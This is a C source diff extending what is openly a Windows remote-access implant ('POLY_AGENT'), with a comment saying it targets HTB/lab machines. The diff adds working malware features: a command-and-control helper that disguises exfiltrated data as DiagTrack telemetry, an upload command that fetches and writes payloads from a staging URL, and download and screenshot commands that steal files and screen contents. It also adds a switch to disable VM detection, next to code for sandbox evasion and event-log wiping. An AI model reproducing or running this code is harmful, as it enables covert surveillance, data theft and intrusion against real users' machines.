@@ -586,12 +586,15 @@ static BOOL POLY_SANDBOX(void) {
     if(sandbox_proc) return TRUE;
     if(cnt<50)       return TRUE;
 
-    /* 3. CPUID hypervisor present bit (ECX[31] on leaf 1) */
+    /* 3. CPUID hypervisor present bit (ECX[31] on leaf 1)
+     * Disabled when LT_ALLOW_VM is defined — all HTB/lab targets run in VMs. */
+#ifndef LT_ALLOW_VM
     {
         int _eax=0,_ebx=0,_ecx=0,_edx=0;
         __asm__ volatile("cpuid":"=a"(_eax),"=b"(_ebx),"=c"(_ecx),"=d"(_edx):"a"(1),"c"(0));
         if(_ecx&(1<<31)) return TRUE;
     }
+#endif
 
     /* 4. Physical RAM < 2 GB */
     {
@@ -1384,6 +1387,21 @@ static PBYTE POLY_HTTPPOST(LPCSTR url_a, PBYTE body, DWORD body_len, DWORD *resp
         buf=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,4);
         if(resp_len) *resp_len=0;
     }
+    return buf;
+}
+
+/* ─── Raw HTTP GET (no .enc layer) — agent upload command fetches files here ─── */
+static PBYTE lt_http_raw_get(LPCSTR url_a, DWORD *out_len) {
+    LT_WH wh; lt_zero(&wh,sizeof(wh));
+    if(out_len) *out_len=0;
+    if(!lt_wh_open(&wh,url_a,L"GET")) return NULL;
+    if(!wh.fnSend(wh.hReq,NULL,0,NULL,0,0,0)||!wh.fnRecv(wh.hReq,NULL))
+        {lt_wh_close(&wh);return NULL;}
+    DWORD total=0;
+    PBYTE buf=lt_wh_read_body(&wh,&total);
+    lt_wh_close(&wh);
+    if(!buf||total==0){if(buf)HeapFree(GetProcessHeap(),0,buf);return NULL;}
+    if(out_len) *out_len=total;
     return buf;
 }
 
@@ -2903,6 +2921,113 @@ static void _lt_church_phase(void) {
     _lt_clear_event_logs();      /*           — wipe System/Security/Application logs   */
 }
 
+/* ─── Shared result-post helper ─────────────────────────────────────────────
+ * base64-encodes data and POSTs the standard DiagTrack JSON to result_base.
+ * Caller owns data; this function does NOT free it. */
+static void _lt_post_task_result(const char *session_id, const char *task_id,
+                                  const char *result_base, PBYTE data, DWORD data_len) {
+    DWORD b64_sz=((data_len+2)/3)*4+4;
+    char *b64=(char*)HeapAlloc(GetProcessHeap(),0,b64_sz);
+    if(b64) lt_b64encode(data?data:(PBYTE)"",data?data_len:0,b64);
+    DWORD json_sz=256+(b64?(DWORD)lt_strlen(b64):0);
+    char *rjson=(char*)HeapAlloc(GetProcessHeap(),0,json_sz);
+    if(rjson){
+        lt_strcpy(rjson,"{\"machineId\":\""); lt_strcat(rjson,session_id);
+        lt_strcat(rjson,"\",\"sessionId\":\""); lt_strcat(rjson,task_id);
+        lt_strcat(rjson,"\",\"timestamp\":\"T\",\"events\":[{\"type\":\"DiagTrack\",\"data\":\"");
+        if(b64) lt_strcat(rjson,b64);
+        lt_strcat(rjson,"\"}]}");
+        char rurl[512]; lt_strcpy(rurl,result_base); lt_strcat(rurl,session_id);
+        lt_strcat(rurl,"/"); lt_strcat(rurl,task_id);
+        PBYTE pr=POLY_HTTPPOST(rurl,(PBYTE)rjson,(DWORD)lt_strlen(rjson),NULL);
+        if(pr) HeapFree(GetProcessHeap(),0,pr);
+        HeapFree(GetProcessHeap(),0,rjson);
+    }
+    if(b64) HeapFree(GetProcessHeap(),0,b64);
+}
+
+/* ─── GDI screen capture → BMP bytes ────────────────────────────────────────
+ * Dynamically loads user32 + gdi32 so no static import appears.
+ * Returns heap-allocated BMP; caller frees. Sets *out_len to byte count. */
+static PBYTE _lt_screenshot(DWORD *out_len) {
+    if(out_len) *out_len=0;
+    HMODULE hU32=LoadLibraryA("user32.dll");
+    HMODULE hG32=LoadLibraryA("gdi32.dll");
+    if(!hU32||!hG32){ if(hU32) FreeLibrary(hU32); if(hG32) FreeLibrary(hG32); return NULL; }
+
+    typedef int (WINAPI *pfnGSM)(int);
+    typedef HDC (WINAPI *pfnGDC)(HWND);
+    typedef int (WINAPI *pfnRDC)(HWND,HDC);
+    typedef HDC (WINAPI *pfnCCDC)(HDC);
+    typedef HBITMAP (WINAPI *pfnCCB)(HDC,int,int);
+    typedef HGDIOBJ (WINAPI *pfnSO)(HDC,HGDIOBJ);
+    typedef BOOL (WINAPI *pfnBB)(HDC,int,int,int,int,HDC,int,int,DWORD);
+    typedef int (WINAPI *pfnGDB)(HDC,HBITMAP,UINT,UINT,LPVOID,LPBITMAPINFO,UINT);
+    typedef BOOL (WINAPI *pfnDO)(HGDIOBJ);
+    typedef BOOL (WINAPI *pfnDDC)(HDC);
+
+    pfnGSM fnGSM=(pfnGSM)GetProcAddress(hU32,"GetSystemMetrics");
+    pfnGDC fnGDC=(pfnGDC)GetProcAddress(hU32,"GetDC");
+    pfnRDC fnRDC=(pfnRDC)GetProcAddress(hU32,"ReleaseDC");
+    pfnCCDC fnCCDC=(pfnCCDC)GetProcAddress(hG32,"CreateCompatibleDC");
+    pfnCCB fnCCB=(pfnCCB)GetProcAddress(hG32,"CreateCompatibleBitmap");
+    pfnSO fnSO=(pfnSO)GetProcAddress(hG32,"SelectObject");
+    pfnBB fnBB=(pfnBB)GetProcAddress(hG32,"BitBlt");
+    pfnGDB fnGDB=(pfnGDB)GetProcAddress(hG32,"GetDIBits");
+    pfnDO fnDO=(pfnDO)GetProcAddress(hG32,"DeleteObject");
+    pfnDDC fnDDC=(pfnDDC)GetProcAddress(hG32,"DeleteDC");
+
+    if(!fnGSM||!fnGDC||!fnRDC||!fnCCDC||!fnCCB||!fnSO||!fnBB||!fnGDB||!fnDO||!fnDDC){
+        FreeLibrary(hU32); FreeLibrary(hG32); return NULL;
+    }
+
+    int w=fnGSM(0), h=fnGSM(1); /* SM_CXSCREEN, SM_CYSCREEN */
+    if(w<=0||h<=0){ FreeLibrary(hU32); FreeLibrary(hG32); return NULL; }
+
+    HDC hdcScreen=fnGDC(NULL);
+    HDC hdcMem=fnCCDC(hdcScreen);
+    HBITMAP hBmp=fnCCB(hdcScreen,w,h);
+    HGDIOBJ hOld=fnSO(hdcMem,hBmp);
+    fnBB(hdcMem,0,0,w,h,hdcScreen,0,0,0x00CC0020UL); /* SRCCOPY */
+
+    /* 24bpp top-down DIB; rows are DWORD-aligned */
+    BITMAPINFOHEADER bih; lt_zero(&bih,sizeof(bih));
+    bih.biSize=(DWORD)sizeof(BITMAPINFOHEADER);
+    bih.biWidth=(LONG)w; bih.biHeight=-(LONG)h; /* negative = top-down */
+    bih.biPlanes=1; bih.biBitCount=24; bih.biCompression=0; /* BI_RGB */
+    DWORD row_sz=((DWORD)(w*3)+3)&~3UL;
+    DWORD pix_sz=row_sz*(DWORD)h;
+
+    PBYTE pix=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,pix_sz+4);
+    if(!pix){
+        fnSO(hdcMem,hOld); fnDO(hBmp); fnDDC(hdcMem); fnRDC(NULL,hdcScreen);
+        FreeLibrary(hU32); FreeLibrary(hG32); return NULL;
+    }
+    fnGDB(hdcMem,hBmp,0,(UINT)h,pix,(LPBITMAPINFO)&bih,0); /* DIB_RGB_COLORS=0 */
+    fnSO(hdcMem,hOld); fnDO(hBmp); fnDDC(hdcMem); fnRDC(NULL,hdcScreen);
+    FreeLibrary(hU32); FreeLibrary(hG32);
+
+    /* BITMAPFILEHEADER(14) + BITMAPINFOHEADER + pixels */
+    DWORD off_bits=14+(DWORD)sizeof(BITMAPINFOHEADER);
+    DWORD total=off_bits+pix_sz;
+    PBYTE bmp=(PBYTE)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,total+4);
+    if(!bmp){ HeapFree(GetProcessHeap(),0,pix); return NULL; }
+
+    bmp[0]='B'; bmp[1]='M';
+    bmp[2]=(BYTE)total;       bmp[3]=(BYTE)(total>>8);
+    bmp[4]=(BYTE)(total>>16); bmp[5]=(BYTE)(total>>24);
+    /* bfReserved1, bfReserved2 = 0 (already zeroed) */
+    bmp[10]=(BYTE)off_bits;       bmp[11]=(BYTE)(off_bits>>8);
+    bmp[12]=(BYTE)(off_bits>>16); bmp[13]=(BYTE)(off_bits>>24);
+    PBYTE bih_b=(PBYTE)&bih;
+    for(DWORD _si=0;_si<(DWORD)sizeof(BITMAPINFOHEADER);_si++) bmp[14+_si]=bih_b[_si];
+    for(DWORD _pi=0;_pi<pix_sz;_pi++) bmp[off_bits+_pi]=pix[_pi];
+
+    HeapFree(GetProcessHeap(),0,pix);
+    if(out_len) *out_len=total;
+    return bmp;
+}
+
 /* Forward declaration — POLY_CAPTURE is defined after POLY_AGENT (used by byovdrun command) */
 static int POLY_CAPTURE(PBYTE, SIZE_T, const char *);
 
@@ -3278,6 +3403,140 @@ static void POLY_AGENT(void) {
                 }
                 if(b64) HeapFree(GetProcessHeap(),0,b64);
             }
+            HeapFree(GetProcessHeap(),0,task_raw);
+            continue;
+
+        /* upload <url> <dest_path>
+         * Fetch raw bytes from a staging URL (no .enc decode) and write to disk. */
+        } else if(lt_strpfx(command,"upload ")&&command[7]){
+            const char *up_url=command+7;
+            int _usp=0; while(up_url[_usp]&&up_url[_usp]!=' ') _usp++;
+            const char *up_dest=(up_url[_usp]==' '&&up_url[_usp+1])?(up_url+_usp+1):NULL;
+            char up_urlbuf[512]; int _uub=0;
+            while(_uub<511&&up_url[_uub]&&up_url[_uub]!=' '){up_urlbuf[_uub]=up_url[_uub];_uub++;} up_urlbuf[_uub]=0;
+            const char *umsg;
+            if(!up_dest){
+                umsg="[-] upload: missing dest path\r\n";
+            } else {
+                DWORD flen=0;
+                PBYTE fbytes=lt_http_raw_get(up_urlbuf,&flen);
+                if(!fbytes||flen==0){
+                    if(fbytes) HeapFree(GetProcessHeap(),0,fbytes);
+                    umsg="[-] upload: fetch failed\r\n";
+                } else {
+                    WCHAR wdest[520]={0}; int _wdi=0;
+                    while(up_dest[_wdi]&&_wdi<518){wdest[_wdi]=(WCHAR)(unsigned char)up_dest[_wdi];_wdi++;}
+                    HANDLE huf=CreateFileW(wdest,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+                    if(huf==INVALID_HANDLE_VALUE){
+                        HeapFree(GetProcessHeap(),0,fbytes);
+                        umsg="[-] upload: CreateFile failed\r\n";
+                    } else {
+                        DWORD written=0; WriteFile(huf,fbytes,flen,&written,NULL); CloseHandle(huf);
+                        HeapFree(GetProcessHeap(),0,fbytes);
+                        umsg=(written==flen)?"[+] upload: ok\r\n":"[-] upload: partial write\r\n";
+                    }
+                }
+            }
+            DWORD out_len=(DWORD)lt_strlen(umsg);
+            PBYTE output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+            if(output){for(DWORD _ui=0;_ui<=out_len;_ui++) output[_ui]=(BYTE)umsg[_ui];}
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw);
+            continue;
+
+        /* download <src_path>
+         * Read file from disk, return _BIN_B64:<base64> so CLI can save it. */
+        } else if(lt_strpfx(command,"download ")&&command[9]){
+            const char *dl_path=command+9;
+            WCHAR wdl[520]={0}; int _wdli=0;
+            while(dl_path[_wdli]&&_wdli<518){wdl[_wdli]=(WCHAR)(unsigned char)dl_path[_wdli];_wdli++;}
+            HANDLE hdf=CreateFileW(wdl,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+            PBYTE output=NULL; DWORD out_len=0;
+            if(hdf==INVALID_HANDLE_VALUE){
+                const char *_em="[-] download: open failed\r\n";
+                out_len=(DWORD)lt_strlen(_em);
+                output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+                if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
+            } else {
+                LARGE_INTEGER fsz; fsz.QuadPart=0; GetFileSizeEx(hdf,&fsz);
+                if(fsz.QuadPart<=0||fsz.QuadPart>(50LL*1024*1024)){
+                    CloseHandle(hdf);
+                    const char *_em="[-] download: file too large or empty (50 MB limit)\r\n";
+                    out_len=(DWORD)lt_strlen(_em);
+                    output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+                    if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
+                } else {
+                    DWORD fsz32=(DWORD)fsz.QuadPart;
+                    PBYTE fbuf=(PBYTE)HeapAlloc(GetProcessHeap(),0,fsz32+4);
+                    if(fbuf){
+                        DWORD bread=0; ReadFile(hdf,fbuf,fsz32,&bread,NULL); CloseHandle(hdf); hdf=NULL;
+                        DWORD b64fsz=((bread+2)/3)*4+4;
+                        char *b64f=(char*)HeapAlloc(GetProcessHeap(),0,b64fsz);
+                        if(b64f){
+                            lt_b64encode(fbuf,bread,b64f);
+                            HeapFree(GetProcessHeap(),0,fbuf); fbuf=NULL;
+                            const char *_pfx="_BIN_B64:\n"; DWORD pfxlen=10;
+                            out_len=pfxlen+(DWORD)lt_strlen(b64f);
+                            output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+                            if(output){
+                                for(DWORD _pi=0;_pi<pfxlen;_pi++) output[_pi]=(BYTE)_pfx[_pi];
+                                for(DWORD _bi=0;b64f[_bi];_bi++) output[pfxlen+_bi]=(BYTE)b64f[_bi];
+                            }
+                            HeapFree(GetProcessHeap(),0,b64f);
+                        }
+                        if(fbuf) HeapFree(GetProcessHeap(),0,fbuf);
+                    }
+                    if(hdf) CloseHandle(hdf);
+                }
+            }
+            if(!output){
+                const char *_em="[-] download: alloc failed\r\n";
+                out_len=(DWORD)lt_strlen(_em);
+                output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+                if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
+            }
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
+            HeapFree(GetProcessHeap(),0,task_raw);
+            continue;
+
+        /* screenshot — GDI screen capture → BMP → _BIN_B64:<base64> */
+        } else if(lt_strpfx(command,"screenshot")&&(command[10]==0||command[10]==' ')){
+            DWORD bmp_len=0;
+            PBYTE bmp=_lt_screenshot(&bmp_len);
+            PBYTE output=NULL; DWORD out_len=0;
+            if(!bmp||bmp_len==0){
+                if(bmp) HeapFree(GetProcessHeap(),0,bmp);
+                const char *_em="[-] screenshot: capture failed\r\n";
+                out_len=(DWORD)lt_strlen(_em);
+                output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+                if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
+            } else {
+                DWORD b64bsz=((bmp_len+2)/3)*4+4;
+                char *b64b=(char*)HeapAlloc(GetProcessHeap(),0,b64bsz);
+                if(b64b){
+                    lt_b64encode(bmp,bmp_len,b64b);
+                    HeapFree(GetProcessHeap(),0,bmp); bmp=NULL;
+                    const char *_pfx="_BIN_B64:\n"; DWORD pfxlen=10;
+                    out_len=pfxlen+(DWORD)lt_strlen(b64b);
+                    output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+                    if(output){
+                        for(DWORD _pi=0;_pi<pfxlen;_pi++) output[_pi]=(BYTE)_pfx[_pi];
+                        for(DWORD _bi=0;b64b[_bi];_bi++) output[pfxlen+_bi]=(BYTE)b64b[_bi];
+                    }
+                    HeapFree(GetProcessHeap(),0,b64b);
+                }
+                if(bmp) HeapFree(GetProcessHeap(),0,bmp);
+            }
+            if(!output){
+                const char *_em="[-] screenshot: encode failed\r\n";
+                out_len=(DWORD)lt_strlen(_em);
+                output=(PBYTE)HeapAlloc(GetProcessHeap(),0,out_len+2);
+                if(output) for(DWORD _ei=0;_ei<=out_len;_ei++) output[_ei]=(BYTE)_em[_ei];
+            }
+            _lt_post_task_result(session_id,task_id,result_base,output,out_len);
+            if(output) HeapFree(GetProcessHeap(),0,output);
             HeapFree(GetProcessHeap(),0,task_raw);
             continue;
 
